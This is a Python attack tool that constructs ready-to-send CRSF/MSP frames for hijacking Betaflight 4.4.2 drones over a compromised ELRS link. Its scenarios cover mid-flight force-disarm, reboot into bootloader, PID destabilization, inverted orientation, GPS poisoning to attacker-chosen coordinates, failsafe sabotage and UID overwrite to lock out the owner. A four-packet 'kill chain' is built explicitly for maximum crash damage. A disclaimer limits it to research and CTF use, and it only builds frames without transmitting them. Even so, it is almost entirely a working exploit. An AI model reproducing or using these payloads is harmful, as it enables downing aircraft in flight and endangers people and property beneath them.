#!/usr/bin/env python3
"""
MSP Command Arsenal — weaponizable MSP commands for ELRS session hijack

Constructs MSP command frames targeting Betaflight 4.4.2's full MSP attack
surface, as documented in the vulnerability audit. Every command here passes
through the MSP-over-ELRS→CRSF→FC pipeline with no authentication beyond
CRC validity + connection state + model match.

Attack premise:
  Once an attacker achieves ELRS pairing (via UID recovery), the MSP
  command table is fully accessible. Betaflight 4.4.2 applies no
  ARMED-state checks on most configuration/control commands, meaning
  they execute even during flight.

  This tool constructs the exact byte sequences for each weaponizable
  MSP command, wrapped in CRSF framing for OTA delivery.

Commands by impact category:

  IMMEDIATE KILL (single packet, instant effect):
    - MSP_SET_ARMING_DISABLED (99): force disarm → motor stop
    - MSP_REBOOT (68): FC reboot → total loss of control
    - MSP_SET_MOTOR (214): direct motor value injection (when disarmed)

  FLIGHT DESTABILIZATION (takes effect immediately):
    - MSP_SET_PID (202): zero/extreme PID gains → oscillation/loss
    - MSP_SET_BOARD_ALIGNMENT_CONFIG (232): flip orientation reference
    - MSP_SET_RAW_GPS (201): poison GPS solution for GPS Rescue

  SAFETY SABOTAGE (deferred effect, persistent):
    - MSP_SET_FAILSAFE_CONFIG (76): rewrite failsafe to DROP + max delay
    - MSP_SET_RX_CONFIG (45): overwrite ELRS UID → lock out real TX
    - MSP_SET_FEATURE_CONFIG (37): disable safety features
    - MSP_SET_PID_ADVANCED (90): destabilize advanced PID tuning

  RECON / INFORMATION GATHERING:
    - MSP_STATUS (101): read FC status, sensors, flags
    - MSP_RAW_GPS (106): read current GPS position
    - MSP_ANALOG (110): read battery voltage/current

Usage:
  # Show all available attack commands with CRSF-wrapped frames
  python3 msp-command-arsenal.py --scenario all

  # Specific attack scenario
  python3 msp-command-arsenal.py --scenario force-disarm

  # Generate a multi-command attack sequence
  python3 msp-command-arsenal.py --scenario kill-chain

  # Target-specific with known UID for full OTA frame construction
  python3 msp-command-arsenal.py --uid 00:00:42:11:18:5b --scenario force-disarm

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import struct
import sys

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# MSP protocol constants (Betaflight 4.4.2)
# ---------------------------------------------------------------------------

# MSP command IDs — no ARMED check (execute during flight)
MSP_SET_ARMING_DISABLED = 99
MSP_REBOOT = 68
MSP_SET_MOTOR = 214
MSP_SET_PID = 202
MSP_SET_PID_ADVANCED = 90
MSP_SET_BOARD_ALIGNMENT_CONFIG = 232
MSP_SET_RAW_GPS = 201
MSP_SET_FAILSAFE_CONFIG = 76
MSP_SET_RX_CONFIG = 45
MSP_SET_FEATURE_CONFIG = 37

# MSP read commands (recon)
MSP_STATUS = 101
MSP_RAW_GPS = 106
MSP_ANALOG = 110
MSP_BOXNAMES = 116
MSP_UID = 160

# MSP v1 framing
MSP_V1_HEADER = b"$M<"  # direction: to FC

# CRSF constants
CRSF_ADDRESS_FC = 0xC8
CRSF_FRAMETYPE_MSP_REQ = 0x7A
CRSF_ADDRESS_TX = 0xEA  # origin: transmitter module


def crc8_dvbs2(data: bytes) -> int:
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0xD5) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def msp_v1_checksum(cmd: int, payload: bytes) -> int:
    cs = len(payload) ^ cmd
    for b in payload:
        cs ^= b
    return cs & 0xFF


def build_msp_frame(cmd: int, payload: bytes = b"") -> bytes:
    """Build an MSP v1 frame: $M< len cmd payload checksum"""
    frame = MSP_V1_HEADER
    frame += bytes([len(payload), cmd])
    frame += payload
    frame += bytes([msp_v1_checksum(cmd, payload)])
    return frame


def wrap_crsf_msp(msp_payload: bytes) -> bytes:
    """Wrap MSP payload in CRSF frame for OTA delivery."""
    # CRSF MSP frame: [dest] [len] [type] [origin] [msp_payload...] [crc]
    inner = bytes([CRSF_ADDRESS_TX]) + msp_payload
    frame_len = len(inner) + 2  # +type +crc
    frame = bytes([CRSF_ADDRESS_FC, frame_len, CRSF_FRAMETYPE_MSP_REQ])
    frame += inner
    crc = crc8_dvbs2(frame[2:])  # CRC over type + inner
    frame += bytes([crc])
    return frame


def build_msp_over_crsf(cmd: int, payload: bytes = b"") -> bytes:
    """Build a complete CRSF-wrapped MSP command."""
    # MSP-over-CRSF uses a compact encoding within the CRSF payload:
    # [flags_and_seqno] [payload_size] [cmd] [payload...] [msp_crc]
    flags = 0x00  # sequence 0, no error, start+end
    msp_crc = msp_v1_checksum(cmd, payload)
    msp_data = bytes([flags, len(payload), cmd]) + payload + bytes([msp_crc])
    return wrap_crsf_msp(msp_data)


# ---------------------------------------------------------------------------
# Attack scenario constructors
# ---------------------------------------------------------------------------

def scenario_force_disarm() -> dict:
    """MSP_SET_ARMING_DISABLED — immediate motor shutdown."""
    payload = bytes([0x01])  # command=1 → disarm
    return {
        "name": "Force Disarm",
        "msp_cmd": MSP_SET_ARMING_DISABLED,
        "msp_cmd_name": "MSP_SET_ARMING_DISABLED",
        "description": (
            "Sends command=1 which calls setArmingDisabled(ARMING_DISABLED_MSP) "
            "followed by disarm(DISARM_REASON_ARMING_DISABLED). No ARMED check. "
            "Motors stop immediately regardless of flight state."
        ),
        "impact": "Immediate motor stop — aircraft falls from sky",
        "armed_check": False,
        "payload_hex": payload.hex(),
        "msp_frame": build_msp_frame(MSP_SET_ARMING_DISABLED, payload),
        "crsf_frame": build_msp_over_crsf(MSP_SET_ARMING_DISABLED, payload),
        "source_ref": "msp.c:3537-3566",
    }


def scenario_reboot() -> dict:
    """MSP_REBOOT — FC reboot, optionally into DFU bootloader."""
    scenarios = []
    for mode, name, desc in [
        (0, "firmware", "Normal reboot — FC restarts, motors stop during reboot"),
        (1, "bootloader", "DFU bootloader — FC stuck in DFU until power cycle"),
        (2, "msc", "Mass storage — FC appears as USB drive, flight impossible"),
    ]:
        payload = bytes([mode])
        scenarios.append({
            "reboot_mode": name,
            "payload_hex": payload.hex(),
            "crsf_frame": build_msp_over_crsf(MSP_REBOOT, payload),
            "description": desc,
        })
    return {
        "name": "FC Reboot",
        "msp_cmd": MSP_REBOOT,
        "msp_cmd_name": "MSP_REBOOT",
        "description": (
            "Reboots the flight controller. During flight, immediate total loss "
            "of motor control. Bootloader mode (1) leaves FC in DFU until power "
            "cycle — effectively bricks the drone mid-flight."
        ),
        "impact": "Total loss of control — FC offline during reboot",
        "armed_check": False,
        "source_ref": "msp.c:2283-2321",
        "modes": scenarios,
    }


def scenario_pid_zero() -> dict:
    """MSP_SET_PID — zero all PID gains to remove stabilization."""
    # PID structure: 3 axes (roll, pitch, yaw) × 3 terms (P, I, D) = 9 bytes
    # All zeros = no stabilization
    payload_zero = bytes(9)
    # Extreme D-term = violent oscillation
    payload_oscillate = bytes([
        0, 0, 255,   # roll: P=0, I=0, D=255
        0, 0, 255,   # pitch: P=0, I=0, D=255
        0, 0, 255,   # yaw: P=0, I=0, D=255
    ])
    return {
        "name": "PID Destabilization",
        "msp_cmd": MSP_SET_PID,
        "msp_cmd_name": "MSP_SET_PID",
        "description": (
            "Overwrites PID controller gains. Zero gains = no stabilization "
            "(aircraft tumbles uncontrollably). Extreme D-term = violent "
            "oscillation. Takes effect immediately on next PID loop iteration. "
            "No ARMED check."
        ),
        "impact": "Loss of stabilization — uncontrolled tumble or oscillation",
        "armed_check": False,
        "source_ref": "msp.c:2665-2672",
        "variants": {
            "zero_all": {
                "description": "All PID gains zeroed — no stabilization",
                "payload_hex": payload_zero.hex(),
                "crsf_frame": build_msp_over_crsf(MSP_SET_PID, payload_zero),
            },
            "max_d_term": {
                "description": "D-term maxed — violent oscillation",
                "payload_hex": payload_oscillate.hex(),
                "crsf_frame": build_msp_over_crsf(MSP_SET_PID, payload_oscillate),
            },
        },
    }


def scenario_flip_orientation() -> dict:
    """MSP_SET_BOARD_ALIGNMENT_CONFIG — invert gyro reference."""
    # boardAlignmentRoll, boardAlignmentPitch, boardAlignmentYaw (int16 each)
    # 1800 = 180 degrees = inverted
    payload = struct.pack("<hhh", 1800, 0, 0)  # roll inverted
    payload_full = struct.pack("<hhh", 1800, 1800, 0)  # roll+pitch inverted
    return {
        "name": "Flip Board Orientation",
        "msp_cmd": MSP_SET_BOARD_ALIGNMENT_CONFIG,
        "msp_cmd_name": "MSP_SET_BOARD_ALIGNMENT_CONFIG",
        "description": (
            "Changes the board alignment offsets. Setting roll=1800 (180°) "
            "inverts the gyro reference — the FC fights itself, pushing the "
            "aircraft in the opposite direction of corrections. No ARMED check."
        ),
        "impact": "FC stabilization inverted — aircraft flips and crashes",
        "armed_check": False,
        "source_ref": "msp.c:3602",
        "variants": {
            "roll_inverted": {
                "description": "Roll axis inverted (180°)",
                "payload_hex": payload.hex(),
                "crsf_frame": build_msp_over_crsf(MSP_SET_BOARD_ALIGNMENT_CONFIG, payload),
            },
            "full_inverted": {
                "description": "Roll + pitch inverted (180° each)",
                "payload_hex": payload_full.hex(),
                "crsf_frame": build_msp_over_crsf(MSP_SET_BOARD_ALIGNMENT_CONFIG, payload_full),
            },
        },
    }


def scenario_gps_poison() -> dict:
    """MSP_SET_RAW_GPS — poison GPS for GPS Rescue failsafe misdirection."""
    # fixType(u8) numSat(u8) lat(i32) lon(i32) alt(u16) speed(u16)
    # Coordinates: 0,0 (null island) with 12 sats and 3D fix
    payload_null_island = struct.pack("<BBiiHH",
        3,    # fixType: 3D fix
        12,   # numSat: 12 (looks healthy)
        0,    # lat: 0° (null island)
        0,    # lon: 0° (null island)
        100,  # alt: 100m
        0,    # speed: 0
    )
    # Coordinates pointing to attacker's chosen location
    # Example: 1km offset from typical flying field
    payload_offset = struct.pack("<BBiiHH",
        3,              # fixType: 3D fix
        12,             # numSat: 12
        389_000_000,    # lat: 38.9° N (example)
        -770_000_000,   # lon: -77.0° W (example)
        50,             # alt: 50m
        0,              # speed: 0
    )
    return {
        "name": "GPS Position Poisoning",
        "msp_cmd": MSP_SET_RAW_GPS,
        "msp_cmd_name": "MSP_SET_RAW_GPS",
        "description": (
            "Directly overwrites the GPS solution state including fix type, "
            "satellite count, and coordinates. If failsafe_procedure=GPS_RESCUE, "
            "poisoned coordinates redirect the drone to attacker-chosen location "
            "during failsafe. No ARMED check."
        ),
        "impact": "GPS Rescue flies to wrong location — fly-away or crash into obstacle",
        "armed_check": False,
        "source_ref": "msp.c:3576-3584",
        "variants": {
            "null_island": {
                "description": "GPS set to 0°,0° (null island) — GPS Rescue flies toward Atlantic",
                "payload_hex": payload_null_island.hex(),
                "crsf_frame": build_msp_over_crsf(MSP_SET_RAW_GPS, payload_null_island),
            },
            "attacker_location": {
                "description": "GPS set to attacker-chosen coordinates",
                "payload_hex": payload_offset.hex(),
                "crsf_frame": build_msp_over_crsf(MSP_SET_RAW_GPS, payload_offset),
            },
        },
    }


def scenario_failsafe_sabotage() -> dict:
    """MSP_SET_FAILSAFE_CONFIG — maximize crash window on link loss."""
    # failsafe_delay(u8) failsafe_off_delay(u8) failsafe_throttle(u16)
    # failsafe_switch_mode(u8) failsafe_throttle_low_delay(u16)
    # failsafe_procedure(u8)
    #
    # failsafe_delay=200 → 20 seconds before failsafe activates
    # failsafe_procedure=0 → DROP (motors off immediately)
    # failsafe_throttle=1000 → minimum throttle during any throttle-based stage
    payload = struct.pack("<BBHBHB",
        200,   # failsafe_delay: 200 (= 20 seconds, max)
        200,   # failsafe_off_delay: 200 (= 20s before motors off)
        1000,  # failsafe_throttle: minimum
        0,     # failsafe_switch_mode: STAGE1_ACTION
        200,   # failsafe_throttle_low_delay: 20 seconds
        0,     # failsafe_procedure: DROP (motors off)
    )
    return {
        "name": "Failsafe Sabotage",
        "msp_cmd": MSP_SET_FAILSAFE_CONFIG,
        "msp_cmd_name": "MSP_SET_FAILSAFE_CONFIG",
        "description": (
            "Rewrites failsafe parameters to maximize damage on link loss. "
            "Sets maximum delay (20s) before failsafe activates, then DROP "
            "(motors off). The 20s window gives attacker time to jam the link "
            "at altitude, letting the drone free-fall. No ARMED check."
        ),
        "impact": "20s uncontrolled flight + motors-off crash on link loss",
        "armed_check": False,
        "source_ref": "msp.c:3704-3711",
        "payload_hex": payload.hex(),
        "crsf_frame": build_msp_over_crsf(MSP_SET_FAILSAFE_CONFIG, payload),
    }


def scenario_uid_overwrite() -> dict:
    """MSP_SET_RX_CONFIG — overwrite ELRS UID to lock out real TX."""
    # The full MSP_SET_RX_CONFIG payload is large (many fields before UID).
    # UID is at offset 34 in the payload (bytes 35-40).
    # We need to send the full structure up to and including UID.
    #
    # For this PoC we show the concept and the relevant payload section.
    attacker_uid = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE])
    return {
        "name": "UID Overwrite (Lock Out Real TX)",
        "msp_cmd": MSP_SET_RX_CONFIG,
        "msp_cmd_name": "MSP_SET_RX_CONFIG",
        "description": (
            "Overwrites the receiver's binding UID with attacker-chosen bytes. "
            "The real transmitter can no longer pair. Runtime change is immediate "
            "for new connections. Requires MSP_EEPROM_WRITE (ARMED-gated) to "
            "persist across reboots."
        ),
        "impact": "Real TX locked out — drone only responds to attacker",
        "armed_check": "Partial — runtime change immediate, persistence requires EEPROM_WRITE (ARMED-gated)",
        "source_ref": "msp.c:3619-3702 (UID at offset 34)",
        "attacker_uid": attacker_uid.hex(":"),
        "note": (
            "Full MSP_SET_RX_CONFIG payload requires preceding fields to be "
            "populated correctly. In practice, read MSP_RX_CONFIG first, "
            "modify UID bytes at offset 34-39, then send back."
        ),
    }


def scenario_kill_chain() -> dict:
    """Multi-command attack sequence for maximum damage."""
    steps = [
        {
            "step": 1,
            "name": "Sabotage failsafe",
            "description": "Set failsafe to DROP with 20s delay — maximizes crash window",
            "cmd": MSP_SET_FAILSAFE_CONFIG,
            "crsf_frame": scenario_failsafe_sabotage()["crsf_frame"],
        },
        {
            "step": 2,
            "name": "Poison GPS",
            "description": "Overwrite GPS to null island — GPS Rescue becomes deadly",
            "cmd": MSP_SET_RAW_GPS,
            "crsf_frame": scenario_gps_poison()["variants"]["null_island"]["crsf_frame"],
        },
        {
            "step": 3,
            "name": "Flip orientation",
            "description": "Invert roll+pitch — FC fights itself",
            "cmd": MSP_SET_BOARD_ALIGNMENT_CONFIG,
            "crsf_frame": scenario_flip_orientation()["variants"]["full_inverted"]["crsf_frame"],
        },
        {
            "step": 4,
            "name": "Force disarm",
            "description": "Stop motors — aircraft falls",
            "cmd": MSP_SET_ARMING_DISABLED,
            "crsf_frame": scenario_force_disarm()["crsf_frame"],
        },
    ]
    return {
        "name": "Full Kill Chain",
        "description": (
            "4-step attack sequence designed for maximum damage:\n"
            "  1. Sabotage failsafe (so link loss = crash, not recovery)\n"
            "  2. Poison GPS (so GPS Rescue flies wrong way)\n"
            "  3. Flip orientation (so re-arm = uncontrollable)\n"
            "  4. Force disarm (motors stop, aircraft falls)\n\n"
            "Steps 1-3 are 'setup' — they modify configuration with no "
            "visible effect until needed. Step 4 is the trigger. Total: "
            "4 MSP packets, deliverable in <100ms at 150Hz ELRS rate."
        ),
        "impact": "Aircraft crash with no recovery option",
        "total_packets": 4,
        "delivery_time_ms": "~27ms at 150Hz (4 packets × 6.67ms interval)",
        "steps": steps,
    }


SCENARIOS = {
    "force-disarm": scenario_force_disarm,
    "reboot": scenario_reboot,
    "pid-zero": scenario_pid_zero,
    "flip-orientation": scenario_flip_orientation,
    "gps-poison": scenario_gps_poison,
    "failsafe-sabotage": scenario_failsafe_sabotage,
    "uid-overwrite": scenario_uid_overwrite,
    "kill-chain": scenario_kill_chain,
}


def print_scenario(scenario: dict, verbose: bool = False):
    print(f"\n{'=' * 70}")
    print(f"Scenario: {scenario['name']}")
    print(f"{'=' * 70}")
    if "msp_cmd" in scenario:
        print(f"  MSP command: {scenario['msp_cmd_name']} ({scenario['msp_cmd']})")
    if "source_ref" in scenario:
        print(f"  Source ref:  {scenario['source_ref']}")
    print(f"  ARMED check: {scenario.get('armed_check', 'None')}")
    print(f"  Impact: {scenario['impact']}")
    print()
    print(f"  {scenario['description']}")

    if "crsf_frame" in scenario:
        frame = scenario["crsf_frame"]
        print(f"\n  CRSF frame ({len(frame)} bytes): {frame.hex()}")

    if "variants" in scenario:
        for vname, v in scenario["variants"].items():
            frame = v["crsf_frame"]
            print(f"\n  Variant: {vname}")
            print(f"    {v['description']}")
            print(f"    CRSF frame ({len(frame)} bytes): {frame.hex()}")

    if "modes" in scenario:
        for m in scenario["modes"]:
            frame = m["crsf_frame"]
            print(f"\n  Mode: {m['reboot_mode']}")
            print(f"    {m['description']}")
            print(f"    CRSF frame ({len(frame)} bytes): {frame.hex()}")

    if "steps" in scenario:
        print(f"\n  Delivery time: {scenario.get('delivery_time_ms', 'N/A')}")
        for step in scenario["steps"]:
            frame = step["crsf_frame"]
            print(f"\n  Step {step['step']}: {step['name']}")
            print(f"    {step['description']}")
            print(f"    CRSF frame ({len(frame)} bytes): {frame.hex()}")

    if "note" in scenario:
        print(f"\n  Note: {scenario['note']}")


def main():
    parser = argparse.ArgumentParser(
        description="MSP Command Arsenal — weaponizable MSP commands for ELRS hijack"
    )
    parser.add_argument(
        "--scenario", required=True,
        choices=list(SCENARIOS.keys()) + ["all"],
        help="Attack scenario to construct",
    )
    parser.add_argument(
        "--uid",
        help="Target UID (hex, colon-separated, 6 bytes) for full OTA framing",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
    )
    args = parser.parse_args()

    print("MSP Command Arsenal — Betaflight 4.4.2 Attack Surface")
    print("Mode: FRAME CONSTRUCTION ONLY — no transmission")
    print()

    if args.uid:
        uid_parts = args.uid.strip().replace("-", ":").split(":")
        uid_bytes = bytes(int(p, 16) for p in uid_parts)
        print(f"  Target UID: {args.uid}")
        from_mod = None
        try:
            from elrs_fhss_seed_resolve import uid_to_fhss_seed, uid_to_crc_init
            seed = uid_to_fhss_seed(uid_bytes)
            crc = uid_to_crc_init(uid_bytes)
            print(f"  FHSS seed:  0x{seed:08x}")
            print(f"  CRC init:   0x{crc:04x}")
        except Exception:
            pass
        print()

    # Assessment header
    print("ASSESSMENT: Betaflight 4.4.2 MSP Attack Surface")
    print("-" * 70)
    print("  The MSP command table is accessible to any ELRS-paired device.")
    print("  Most configuration and control commands lack ARMED-state checks,")
    print("  meaning they execute during flight. A single MSP_SET_ARMING_DISABLED")
    print("  packet (1 byte payload) causes immediate motor shutdown. The full")
    print("  kill chain (4 packets) takes ~27ms to deliver at 150Hz.")
    print()
    print("  This is not a bug in any single command — it's a design decision")
    print("  that treats the ELRS link as trusted. Once pairing is compromised")
    print("  (binding phrase recovery), the entire MSP surface is exposed.")

    results = {"scenarios": {}}

    if args.scenario == "all":
        for name, fn in SCENARIOS.items():
            s = fn()
            print_scenario(s, args.verbose)
            results["scenarios"][name] = s
    else:
        s = SCENARIOS[args.scenario]()
        print_scenario(s, args.verbose)
        results["scenarios"][args.scenario] = s

    if args.output:
        # Convert bytes to hex strings for JSON serialization
        def sanitize(obj):
            if isinstance(obj, bytes):
                return obj.hex()
            if isinstance(obj, dict):
                return {k: sanitize(v) for k, v in obj.items()}
            if isinstance(obj, list):
                return [sanitize(v) for v in obj]
            return obj

        with open(args.output, "w") as f:
            json.dump(sanitize(results), f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
